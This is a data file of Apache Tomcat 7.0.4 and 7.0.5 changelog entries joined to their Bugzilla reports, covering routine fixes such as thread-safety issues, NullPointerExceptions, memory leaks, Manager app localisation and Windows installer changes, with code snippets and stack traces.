Jasper|Tomcat 7.0.5 (markt)|fix|50293|Increase the size of internal ELResolver array from 2 to 8 since in typical usage there are at least 5 resolvers. Based on a patch by Robert Goff. (markt)|javax.el.CompositeELResolver synchronization issue|"Created attachment 26310 [details]
Synchronize change in CompositeELResolver.add

The javax.el.CompositeELResolver.add method needs to synchronize around the update to the resolvers.  If two threads call add, then it is possible for both threads get past the size check, then one thread updates the size, and when the next thread tries to update the size, it fails with an ArrayIndexOutOfBoundsException.

Also, it makes sense to increase the default size of the ELResolver array since even the jasper EL adds 5 ELResolvers.  I propose a default of 8."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50293
Cluster|Tomcat 7.0.5 (markt)|fix||Add support for maxActiveSessions attribute to BackupManager. (kfujino)|||
Cluster|Tomcat 7.0.5 (markt)|fix||Improve sending an access message in DeltaManager. maxInactiveInterval of not Manager but the session is used. If maxInactiveInterval is negative, an access message is not sending. (kfujino)|||
Cluster|Tomcat 7.0.5 (markt)|fix|50183|BIO sender was not scheduling tasks to the executor during normal operation. Patch provided by Ariel. (markt)|[Tribes] Bio Sender is not scheduling the task to the excecutors|"Created attachment 26228 [details]
proposed patch

Hi,

I'm using apache tribes outside of Tomcat.
Although my version is not the latest one, the bug also occurs in Trunk.

It seems that there was a refactor (using executors instead of threads and monitors) and BioReceiver is not scheduling the task.

(I think that the patch is much more descriptive than any comment I could write)

Regards,
Ariel"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50183
Cluster|Tomcat 7.0.5 (markt)|fix|50184|Add an option to the RpcChannel to enable the Channel send options to be set for the reply message. Based on a patch by Ariel. (markt)|RpcChannel sends the answer without requesting an ACK|"Created attachment 26229 [details]
proposed patch

Hi,

I'm using apache tribes outside of Tomcat.
Although my version is not the latest one, this also applies to trunk.

I have a customer that was using Bio senders (a version before to the excecutors refactor see bug 50183), and there were experiencing some weird behavior. (I couldn't reproduce it, but I guess it is related with the platform since they are using solaris)

My application uses tribes to create an RPC channel. They also had some network issues.
So, in certain occasions, the application invoked a remote method, the remote node processed the invocation and send the answer back (but it is not received in the first node).
So, the timeout occurs and eventually a new RPC invocation occurs. But this time, the second node realized that there is a socket issue when trying to send the answer back (it gets a broken pipe exception). Them the connection is re-established and the message is received without any issues.

My customer is complaining about the timeout that occurred the first time.

To send the message we do the following:
BioSender.pushMessage(.....) {
    ...
    soOut.write(data);
    soOut.flush();
    ...
}
But the flush operation does not warranty that the message was successfully sent to the network. It just warranty that the information was passed to the S.O. 
http://download.oracle.com/javase/6/docs/api/java/io/OutputStream.html#flush()

So, in order to avoid this issue I thought that we can modify the RpcChannel to send the reply message using SEND_OPTIONS_USE_ACK option.
Setting this, the remote node will be able to detect situations like the one I commented, and recreate the connection.

I'm attaching a patch with my proposal.


Thanks for your time.

Regards,
Ariel"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50184
Cluster|Tomcat 7.0.5 (markt)|fix||Ensure that a new Context waiting for session data from other nodes in the cluster does not block the processing of clustering messages for other Contexts. (markt)|||
Web applications|Tomcat 7.0.5 (markt)|fix|49426|Localize messages in the Manager application based on the Locale of the user rather than the default Locale of the server. (markt)|Manager app wrongly localized|"Created attachment 25582 [details]
Patch (with unit test) fixing the problem for the ManagerServlet

The manager app shows message using the server's default locale whereas it should react on the request Locale.

The cause is that the ManagerServlet uses StringManager what is fine for messages that are logged but not for those that are sent as responses.

The attached patch fixes the problem for the ManagerServlet but not for the HTMLManagerServlet. It will require a bit more refactoring there because the same messages may be intended for log or for output to the response. I can propose a second patch for it once the problem has been fixed for the ManagerServlet.

For info: same problem occurs in Tomcat 6."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49426
Web applications|Tomcat 7.0.5 (markt)|fix||Localize messages in the Host Manager application based on the Locale of the user rather than the default Locale of the server. (markt)|||
Web applications|Tomcat 7.0.5 (markt)|add|50242|Provide a sample log4j configuration that more closely matches the default JULI configuration. Patch provided by Christopher Schultz. (markt)|Sample log4j configuration does not match default JULI-based configuration|"The default configuration for JULI that ships with Tomcat is somewhat complex: it defines a number of handlers and maps application and server logging to each.

The sample configuration for log4j in the logging documentation is quite simple and just shoves everything into a single log file.

It would be nicer to include a sample configuration for log4j that mirrors the default one."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50242
Web applications|Tomcat 7.0.5 (markt)|add||Restore the ability to edit the contents of /WEB-INF and /META-INF via WebDAV via the provision of a new configuration option, allowSpecialPaths. (markt)|||
Web applications|Tomcat 7.0.5 (markt)|fix||Correct broken links for on-line JavaDocs. (markt)|||
Web applications|Tomcat 7.0.5 (markt)|fix|50230|Add new DistributedManager interface that is implemented by the Backup Manager to remove circular dependency between tomcat-catalina-ha and tomcat-catalina modules. Also allows third-party distributed Manager implementations to report full session information through the HTML Manager. (markt)|Recursive dependency between the tomcat-catalina-ha and tomcat-catalina|"From the pom file of tomcat-catalina-ha, it depends on the tomcat-catalina. But one class HTMLManagerServlet in the tomcat-catalina has a reference to a class BackupManager in the tomcat-catalina-ha.  Is there a way to remove the recursive dependency between those two components ?
    By the way, there mightbe a NullPointerException issue while using the BackupManager in the HTMLManagerServlet.
    ---> line.523
     Manager manager = ctxt.getManager();
                if (manager instanceof BackupManager && showProxySessions) {
                    args[5] = new Integer(
                            ((BackupManager)manager).getActiveSessionsFull());
                } else if (ctxt.getManager() != null){
                    args[5] = new Integer(manager.getActiveSessions());
                } else {
                    args[5] = new Integer(0);
                }
    <---

Please also check the thread from
http://www.mail-archive.com/users@tomcat.apache.org/msg83188.html"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50230
Web applications|Tomcat 7.0.5 (markt)|update||Improve Tomcat Logging documentation. (kkolinko)|||
Web applications|Tomcat 7.0.5 (markt)|fix|50303|Update JNDI how-to to reflect the new JavaMail download location and that JAF is now included in Java SE 6. (markt)|typo, improvements to Tomcat 6 doc|"Hello,

1)
In 
http://tomcat.apache.org/tomcat-6.0-doc/jndi-resources-howto.html#JavaMail_Sessions
please correct
message.setFrom(new InternetAddress(request.getParameter(""from""));
to
message.setFrom(new InternetAddress(request.getParameter(""from"")));

2)
""The Java Activation Framework can be downloaded from Sun's site."" isn't correct, the link goes nowhere. According to Oracle, JAF is part of java SE 6.
http://java.sun.com/products/javamail/javamail-1_4_2.html

3)
After ""4. Install the JavaMail libraries"", and ""1. Install Your JDBC Driver"" you might want to mention ""restart tomcat"".

Tilman Hausherr"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50303
Web applications|Tomcat 7.0.5 (markt)|fix||Fix ordering functionality on sessions page for the HTML Manager application. (markt)|||
Web applications|Tomcat 7.0.5 (markt)|fix||Fix primary sessions not always being treated as such in the HTML Manager application. (markt)|||
Web applications|Tomcat 7.0.5 (markt)|fix||Fix message not being displayed after session attribute removal in the HTML Manager application. (markt)|||
Web applications|Tomcat 7.0.5 (markt)|fix|50310|Fix display of Servlet information in the Manager application. (markt)|Manager detailed status page does not display servlets|"To reproduce:
1. Login to the Manager webapp
2. Click ""Server Status"" and then ""Complete Server Status"" links.



In TC6 the ""Complete Server Status"" page lists servlets for each deployed application.

In the current TC7 it does not list them. Only summary information on each webapp is displayed.


Looking at the StatusManagerServlet and StatusTransformer classes, the code to iterate over servlets is still there, but probably the JMX names have changed and are not working any more."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50310
Web applications|Tomcat 7.0.5 (markt)|fix||CVE-2010-4172: Multiple XSS in the Manager application. (markt/kkolinko)|||
Web applications|Tomcat 7.0.5 (markt)|fix|50316|Fix display of negative values in the Manager application. (kkolinko)|Minor glitch with display of negative TTL on sessionDetail.jsp|"Created attachment 26331 [details]
sessionDetail.jpg - screenshot

To reproduce
1. Start Tomcat
2. Create a session
3. Stop Tomcat. Wait for more than TTL (default: 30 minutes). Start Tomcat.
4. Go to the Manager web application and look at the Session Details page for the session.

I had some instance of 6.0.29 lying on my drive for several months. The TTL value was printed as ""0-2982:0-20:0-59"" instead of ""-2982:20:59"". I am attaching the screenshot.  I wonder why the session was still alive, but that is a different question.

The bug is in JspHelper.secondsToTimeString(), as it does not deal with negative values."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50316
Web applications|Tomcat 7.0.5 (markt)|fix|50318|Avoid NPE when trying to view session detail for an expired session in the Manager application. (markt)|NPE when opening Session Details page for an expired session|"Running current trunk at r1037887

1. In default web.xml set <session-timeout> to some small value, e.g. 1 minute
2. Create a session, e.g. in the examples webapp.
3. Go to the manager webapp and display the list of sessions.
4. Do not close the page. Wait for several minutes, so that session expires.
5. Click on the session id, to open the Session Details page for the session.
6. Actual result: The page does not open, but the default page (the list of webapps) is shown, with a message about an NPE.
Expected result: I would be nice to display a blank Session Details page with a message and with the ""Return to session list"" button.


org.apache.jasper.JasperException: An exception occurred processing JSP page /WEB-INF/jsp/sessionDetail.jsp at line 35

32:    String version = (String) request.getAttribute(""version"");
33:    ContextName cn = new ContextName(path, version);
34:    Session currentSession = (Session)request.getAttribute(""currentSession"");
35:    HttpSession currentHttpSession = currentSession.getSession();
36:    String currentSessionId = JspHelper.escapeXml(currentSession.getId());
37:    String submitUrl = JspHelper.escapeXml(response.encodeURL(
38:            ((HttpServletRequest) pageContext.getRequest()).getRequestURI() +

Line 35 is ""currentSession.getSession()""

From logs:
Caused by: java.lang.NullPointerException
	at org.apache.jsp.WEB_002dINF.jsp.sessionDetail_jsp._jspService(sessionDetail_jsp.java:74)
	at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:68)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
	at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:416)
	... 33 more"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50318
Other|Tomcat 7.0.5 (markt)|fix||Correct a handful of Javadoc warnings. (markt)|||
Other|Tomcat 7.0.5 (markt)|fix|22965|Fix some typos and formatting issues in the global web.xml file. Based on a patch by Yann C√©bron. (markt)|[PATCH] Tidy up conf/web.xml|"Patch below for conf/web.xml:

- fix minor spelling mistakes
- reference parameters by '[parametername]', parameter values by ""[value]"" for
  easier reading
- reindent/format all paragraphs
- update comments: 
  * default servlet is disabled by default, too
  * update/add some documentation to ""Welcome File List"""|https://bz.apache.org/bugzilla/show_bug.cgi?id=22965
Other|Tomcat 7.0.5 (markt)|add||Extend Checkstyle validation checks to check for unused imports. (markt)|||
Other|Tomcat 7.0.5 (markt)|fix||General code clean-up to reduce (not eliminate) the number of warnings reported by IDEs. (markt)|||
Other|Tomcat 7.0.5 (markt)|fix|50140|Don't ignore a user specified installation directory when performing a silent install with the Windows installer on 64-bit platforms. (markt)|Silent installation into wrong target directory|"Incorrect silent installation on Windows 2008 Enterprise:

Command: apachetomcat-6.0.26.exe /S /D=c:\tomcat

Tomcat files are copied to ""c:\Program Files"" instead of ""c:\tomcat""
The installation works fine on Windows XP and Windows 2003 Server systems."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50140
Other|Tomcat 7.0.5 (markt)|update||Reimplemented Windows installer dialogs, using modern libraries (nsDialogs, MUI2). (kkolinko)|||
Other|Tomcat 7.0.5 (markt)|add||When installing with the Windows installer on 64-bit platforms, allow the user to select either a 32-bit JDK or a 64-bit JDK. If a 32-bit JDK is selected, the 32-bit service wrapper and the 32-bit native DLL will be installed. If a 64-bit JDK is selected, the 64-bit service wrapper and the 64-bit native DLL will be installed. (markt/kkolinko)|||
Other|Tomcat 7.0.5 (markt)|add||Create Windows shortcuts for the Manager and Host Manager webapps. (kkolinko)|||
Other|Tomcat 7.0.5 (markt)|add||Support /? command line option in the Windows Installer. (kkolinko)|||
Other|Tomcat 7.0.5 (markt)|add||Display and allow to change roles for the Tomcat admin user in the Windows installer. (kkolinko)|||
Other|Tomcat 7.0.5 (markt)|fix||In the Windows installer: do not leave stale server.xml and tomcat-users.xml fragments in the $TEMP folder. (kkolinko)|||
Other|Tomcat 7.0.5 (markt)|update|49819|Redesign of home page by Pid (pidster at apache). (timw)|Improved index.html for default ROOT application|"I aim to improve the index.html for the ROOT application delivered with Tomcat.

There is a prototype at: http://people.apache.org/~pidster/tomcat/ROOT/ which I offer for comment & criticism.

N.B. It's a hassle to make it look pretty in IE, so I'll defer doing that until after, (or if), there is positive feeling about the proposal and any proposed changes are made.  
It currently ought to work as intended in Chrome, Safari and Firefox 3.5+."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49819
Catalina|Tomcat 7.0.4 (markt)|fix|49428|Re-implement the fix for bug 49428 ‚Äì namespace issues for some Microsoft WebDAV clients. (kkolinko)|Fix WebDAV mounts from Windows Mini-Redirector clients|"Created attachment 25584 [details]
The patch for WebdavServlet

The WebdavServlet does not work with native Windows clients besides the deprecated Web Folders. The more modern, common and supported by Microsoft client, Windows Mini-Redirector that allows mapping of WebDAV shares to local drives cannot mount a WebDAV share served by tomcat's WebdavServlet.

You can observe this by using the following command from a windows machine:

> net use * http://hostname:8080/webdav

It should fail without the attached patch. The reason is that:

DAV: namespaced elements in a PROPFIND responses can not use a default namespace; each element must be explicitly prefixed with a namespace prefix defined in itself or a parent. If a default namespace is used the client will give no errors, but will not display any resources.

This is mentioned here, albeit for a single Windows version, Windows Server 2003:

http://www.greenbytes.de/tech/webdav/webdav-redirector-list.html

I have verified that the patch fixes WebDAV mounts for Windows XP, Vista & 7."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49428
Catalina|Tomcat 7.0.4 (markt)|fix|49669|Fix memory leak triggered by using the deprecated javax.security.auth.Policy class. (markt)|Static reference from  javax.security.auth.Policy.contextClassLoader prevents an undeployed Web application from being garbage collected|"Overview
The class javax.security.auth.Policy has a static member contextClassLoader that can refer to the WebappClassLoader of an application. If that happens, the web application cannot be garbage collected after undeploy.

Steps to reproduce
Create a web application that uses Axis 1 as SOAP server. Deploy the web application in Tomcat. Make a SOAP call to the webapplication. Undeploy the web application. Wait an hour.
Make a memory dump using jmap, and inspect the memory using jhat.

Actual results
The WebappClassLoader for the web application is still present. Its ""reference chains from rootset"" shows a reference like this:
System Class Reference :
--> class javax.security.auth.Policy (84 bytes) (static field contextClassLoader:)
--> org.apache.catalina.loader.WebappClassLoader@0xeb52ba60 (165 bytes) 

Expected results
There is no WebappClassLoader for this web application anymore.

Build date & platform
Downloaded Core tar.gz from http://tomcat.apache.org/download-70.cgi"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49669
Catalina|Tomcat 7.0.4 (markt)|fix|49922|Don't add filter twice to filter chain if the filter matches more than one URL pattern and/or Servlet name. Patch provided by heyoulin. (markt)|ApplicationFilterChain more than the same filter|"When i web.xml like this:

<filter>
    <filter-name>Seam Filter</filter-name>
    <filter-class>org.jboss.seam.servlet.SeamFilter</filter-class>
  </filter>
  <filter-mapping>
    <filter-name>Seam Filter</filter-name>
    <url-pattern>/app/yofc/*</url-pattern>
  </filter-mapping>
  <filter-mapping>
    <filter-name>Seam Filter</filter-name>
    <url-pattern>*.seam</url-pattern>
  </filter-mapping>

then ApplicationFilterChain have two same Seam Filter.

this would cause some app error. Patch:

void addFilter(ApplicationFilterConfig filterConfig) {
    	for(ApplicationFilterConfig filter:filters)
    		if(filter==filterConfig)
    			return;
        if (n == filters.length) {
            ApplicationFilterConfig[] newFilters =
                new ApplicationFilterConfig[n + INCREMENT];
            System.arraycopy(filters, 0, newFilters, 0, n);
            filters = newFilters;
        }
        filters[n++] = filterConfig;

    }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49922
Catalina|Tomcat 7.0.4 (markt)|fix|49937|Use an InstanceManager when creating an AsyncListener through the AsyncContext to ensure annotations are processed. Based on a patch by David Jencks. (markt)|Problems with AsyncListener and resource injection|"Created attachment 26031 [details]
propose fix for a couple possible async listener problems

I asked about these on the dev list and am proposing some simple fixes in case there's agreement that they are bugs.

1. AsyncListeners are subject to resource injection from annotations, so they should be created using the instance manager. To get the instance manager to the AyncContextImpl I added a getInstanceManager() method to the Context interface.  Maybe there's a better way, this interface is currently not very small or simple.

2. various application code can use one of the ServletContext.addListener methods to tell the container to scan for annotations.  Just because tomcat doesn't yet actually scan doesn't mean it should throw an exception if you try this.

cf servlet 3.0 spec section 15.5 page 179."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49937
Catalina|Tomcat 7.0.4 (markt)|fix||To avoid NoSuchMethodException, xmlValidation and xmlNamespaceAware are removed from the createStandardHost definition of mbeans-descriptors.xml. (kfujino)|||
Catalina|Tomcat 7.0.4 (markt)|fix|49945|Continue improvements to JMX. Fix a handful of attributes that were showing as Unavailable in JConsole. Patch provided by Chamith Buddhika. (markt)|Continuation of JMX Descriptor Improvements|"Created attachment 26040 [details]
o.a.Catalina.core+o.a.Catalina.startup Descriptor Patch

In this patch some faulty attributes in o.a.catalina.core and o.a.catalina.startup descriptors have been corrected. With this almost all the remaining attributes with issues (showing up as red in JConsole) are due to the fact that they are not in a serializble form (not primitive types)  to be displayed by JConsole. (A solution to this might be remove them altogether or returning their String representation if that makes sense.)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49945
Catalina|Tomcat 7.0.4 (markt)|fix|49952|Allow ServletContainerInitializers to add listeners to a web application. Patch provided by David Jencks. (markt)|ServletContainerInitializer can't actually add listeners|"Created attachment 26044 [details]
Keep the listeners added by ServletContainerInitializer

Any listeners added by a ServletContainerInitializer will be wiped out when the listeners from web.xml are sorted and overwrite the arrays that already have the SCI-added listeners in them.

I've taken the approach of keeping the single list of listeners from web.xml and keeping the sort into types in listenerStart.  I think it might also be possible and more elegant to have the addApplicationListener method be the same code as the ServletContext.addListener(String listenerClassName) method.

Patch includes a test demonstrating the problem.  The patch to ServletContext may need line number adjustment unless you have applied my patch for supplying the jsp file as a jsp servlet init param."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49952
Catalina|Tomcat 7.0.4 (markt)|fix|49956|Handle case when @Resource annotation uses the full JNDI name for a resource. Based on a patch by Gurkan Erdogdu. (markt)|@Resource(name=) Normalization of JNDI Name|"Created attachment 26048 [details]
Resolves issue

name attribute of @Resource defines JNDI name of the resource that binds the resource to web component java:comp/env/. 

java:comp/env/bla..bla.. could be given as a JNDI name. Therefore before using name in DefaultInstanceManager to inject fields & methods, it must be normalized.

For example, 
@Resource(name=""java:comp/env/myDataSource"") 
DataSource ds;

Before looking up ""context.lookup(name)"" in DefaultInstanceManager, we have to normalize name to ""myDataSource"".

Patch is attached"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49956
Catalina|Tomcat 7.0.4 (markt)|fix|49557|Correct regression due to Lifecycle refactoring that cleared all work directories (with compiled JSPs and persisted sessions) when Tomcat was stopped. (markt)|index erro in the loop to get the env info in the proc.create function|"line 232:s_env[i+1] = tcn_get_string(e, str);

this will crash the java vm for a violate access error."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49557
Catalina|Tomcat 7.0.4 (markt)|fix|49978|Correctly handle the case when a directory expected to be created during web application start is already present. Rather than throwing an exception and failing to start, allow the web application to start normally. (markt)|WebappLoader throws exception if workDir already exists (when unpackWARs=false)|"In WebappLoader.setRepositories(), if the war is not unpacked, it tries to create a directory /WEB-INF/classes inside the workDir.  If that directory already exists, an error is thrown and the webapp does not start.

This is a change from 5.5, which didn't check the return value of classRepository.mkdirs().  mkdirs() returns false if the directories already exist.  I doubt it was the intention here.  Probably the intention was to throw an exception if the directory could not be created, rather than if it already existed."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49978
Catalina|Tomcat 7.0.4 (markt)|fix|49987|Fix thread safety issue with population of servlet context initialization parameters. (markt)|Data race in ApplicationContext|"r998053
http://svn.apache.org/repos/asf/tomcat/tc6.0.x/trunk/java/org/apache/catalina/core/ApplicationContext.java

Data race on variable 
private Map parameters

In method

    private void mergeParameters() {

        if (parameters != null)  // concurrent read : 881
            return;
        Map results = new ConcurrentHashMap();
        ...
        parameters = results; // concurrent write : 897

    }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49987
Catalina|Tomcat 7.0.4 (markt)|fix|49994|As per the Java EE 6 specification, return a new object instance for each JNDI look up of a resource reference. (markt)|NamingContext Possible Bug|"In NamingContext implementation, if ""lookup()"" is a Reference, current
implementation caches the result of the NamingManager # getObjectInstance via
following statements and changes the type of the entry. In the following
lookups, same object is returned. I would like to write ObjectFactory that
returns new instance for each time lookup is called on its reference. But with
the current implementation, it is not possible to write such an object factory
because of aferomentioned sitaution. I think that entry must be stay as
Reference instead of changing entry type.

NamingContext class:

protected Object lookup(Name name, boolean resolveLinks)
        throws NamingException {
.....
            } else if (entry.type == NamingEntry.REFERENCE) {
                try {
                    Object obj = NamingManager.getObjectInstance
                        (entry.value, name, this, env);
                    if (obj != null) {
                        entry.value = obj;                           
                        entry.type = NamingEntry.ENTRY;  ---> CHANGES type of
the naming entry
                    }
                    return obj;
                } catch (NamingException e) {
                    throw e;
                } catch (Exception e) {
                    log.warn(sm.getString
                            (""namingContext.failResolvingReference""), e);
                    throw new NamingException(e.getMessage());
                }
            }

...........
}"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49994
Catalina|Tomcat 7.0.4 (markt)|fix|50015|Re-factor dynamic servlet security implementation to make extensions, such as JACC implementations, simpler. Patch provided by David Jencks. (markt)|dynamic servlet security incomplete and badly distributed|"The current implementation of dynamic servlet security through ServletRegistration.Dynamic.setServletSecurity and the ServletContext.createServlet and addServlet methods is incomplete, and includes some logic that exposes internals of the tomcat security framework directly in the ServletRegistration.Dynamic implementation.

The attached patch:

- moves the logic that depends on the internals of tomcats security implementation from ApplicationServletRegistration to StandardContext where it can at least be overridden by e.g. jacc implementations

- provides notifications to StandardContext of users calling createServlet and addServlet on ApplicationContext/ServletContext so subclasses of StandardContext can implement the spec behavior without subclassing ApplicationContext.

This patch is generated from a tomcat copy that already has several other patches I've proposed applied.  Let me know if there are problems applying it."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50015
Catalina|Tomcat 7.0.4 (markt)|fix|50016|Re-factor isUserInRole() and login()/logout() methods to support JACC implementations and to improve encapsulation. Patch provided by David Jencks. (markt)|bad division of responsibility around isUserInRole and new Request login and logout methods|"Created attachment 26089 [details]
improve division of responsibility for isUserInRole and login/logout methods

There are 2 similar problems that have a bad division of responsibility.

1. Request.isUserInRole tries to prevent jacc implementations and is also wrong.

In the current tomcat implementation, role-ref mappings are first applied to the supplied role and then the target role is tested. If the user is not in the mapped role the original role is tested. However,
(a). jacc requires that this be implemented by constructing a role-ref permission with the current servlet name and the supplied (not mapped) role. So to be reasonably amenable to a jacc implementation Request.isUserInRole should supply the original role and if possible the servlet name to the wrapper.
(b) if there is a mapping, only the mapped role should be checked. Aside from the spec language, consider a web app with two roles A and B and a servlet S that maps A to B and B to A. A user that logs in and is in role A and not B should be able to test in S

is in A >> false
is in B >> true

The current implementation reports true for both A and B.

2. The implementation of the new login and logout methods are excessively intrusive into the internals of the authentication. Both should be delegated directly to the Authenticator. In particular, checking which known Authenticator is installed to see if it supports user/pw login is overly restrictive since other authenticators might be installed. The authenticator also ought to be able to decide if it wants to cache the authentication results."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50016
Catalina|Tomcat 7.0.4 (markt)|update|50017|Code clean-up. No functional change. Patch provided by sebb. (markt)|Make private immutable fields final|"Created attachment 26090 [details]
Patch javax.el package

Patches to make immutable private fields final."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50017
Catalina|Tomcat 7.0.4 (markt)|fix|50027|Avoid NPE on start when a Context is defined in server.xml with one or more JNDI resources. (markt)|NullPointerException if context.xml is present with <Resource>|"If you deploy a WAR with contex.xml in META-INF and the context.xml has <Resource> tag, Tomcat don¬¥t boot and gives this error:

java.lang.NullPointerException
	at org.apache.catalina.core.StandardContext.getObjectKeyPropertiesNameOnly(StandardContext.java:5570)
	at org.apache.catalina.core.StandardContext.setNamingResources(StandardContext.java:1757)
	at org.apache.catalina.core.StandardContext.getNamingResources(StandardContext.java:1735)
	at org.apache.catalina.startup.SetNextNamingRule.end(SetNextNamingRule.java:99)
	at org.apache.tomcat.util.digester.Digester.endElement(Digester.java:1058)
	at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.endElement(AbstractSAXParser.java:601)
	at com.sun.org.apache.xerces.internal.parsers.AbstractXMLDocumentParser.emptyElement(AbstractXMLDocumentParser.java:180)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanStartElement(XMLDocumentFragmentScannerImpl.java:1343)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver.next(XMLDocumentFragmentScannerImpl.java:2755)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(XMLDocumentScannerImpl.java:648)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(XMLDocumentFragmentScannerImpl.java:511)
	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:808)
	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:737)
	at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:119)
	at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1205)
	at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:522)
	at org.apache.tomcat.util.digester.Digester.parse(Digester.java:1544)
	at org.apache.catalina.startup.Catalina.load(Catalina.java:524)
	at org.apache.catalina.startup.Catalina.load(Catalina.java:560)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.apache.catalina.startup.Bootstrap.load(Bootstrap.java:260)
	at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:414)
29/09/2010 13:50:37 org.apache.catalina.startup.Catalina load
AVISO: Catalina.start using conf/server.xml: 
java.lang.NullPointerException
	at org.apache.tomcat.util.digester.Digester.createSAXException(Digester.java:2688)
	at org.apache.tomcat.util.digester.Digester.createSAXException(Digester.java:2714)
	at org.apache.tomcat.util.digester.Digester.endElement(Digester.java:1061)
	at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.endElement(AbstractSAXParser.java:601)
	at com.sun.org.apache.xerces.internal.parsers.AbstractXMLDocumentParser.emptyElement(AbstractXMLDocumentParser.java:180)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanStartElement(XMLDocumentFragmentScannerImpl.java:1343)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver.next(XMLDocumentFragmentScannerImpl.java:2755)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(XMLDocumentScannerImpl.java:648)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(XMLDocumentFragmentScannerImpl.java:511)
	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:808)
	at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:737)
	at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:119)
	at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1205)
	at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:522)
	at org.apache.tomcat.util.digester.Digester.parse(Digester.java:1544)
	at org.apache.catalina.startup.Catalina.load(Catalina.java:524)
	at org.apache.catalina.startup.Catalina.load(Catalina.java:560)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.apache.catalina.startup.Bootstrap.load(Bootstrap.java:260)
	at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:414)
Caused by: java.lang.NullPointerException
	at org.apache.catalina.core.StandardContext.getObjectKeyPropertiesNameOnly(StandardContext.java:5570)
	at org.apache.catalina.core.StandardContext.setNamingResources(StandardContext.java:1757)
	at org.apache.catalina.core.StandardContext.getNamingResources(StandardContext.java:1735)
	at org.apache.catalina.startup.SetNextNamingRule.end(SetNextNamingRule.java:99)
	at org.apache.tomcat.util.digester.Digester.endElement(Digester.java:1058)
	... 20 more
29/09/2010 13:50:37 org.apache.tomcat.util.digester.SetPropertiesRule begin
AVISO: [SetPropertiesRule]{Server/Service/Engine/Host/Context} Setting property 'source' to 'org.eclipse.jst.jee.server:bestforkprime' did not find a matching property.
29/09/2010 13:50:37 org.apache.tomcat.util.digester.Digester endElement
GRAVE: End event threw exception
java.lang.NullPointerException
	at org.apache.catalina.core.StandardContext.getObjectKeyPropertiesNameOnly(StandardContext.java:5570)
	at org.apache.catalina.core.StandardContext.setNamingResources(StandardContext.java:1757)
	at org.apache.catalina.core.StandardContext.getNamingResources(StandardContext.java:1735)
	at org.apache.catalina.startup.SetNextNamingRule.end(SetNextNamingRule.java:99)
	at org.apache.tomcat.util.digester.Digester.endElement(Digester.java:1058)
	at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.endElement(AbstractSAXParser.java:601)
	at com.sun.org.apache.xerces.internal.parsers.AbstractXMLDocumentParser.emptyElement(AbstractXMLDocumentParser.java:180)
	at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanStartElement(XMLDocumentFragmentScannerImpl.java:1343)
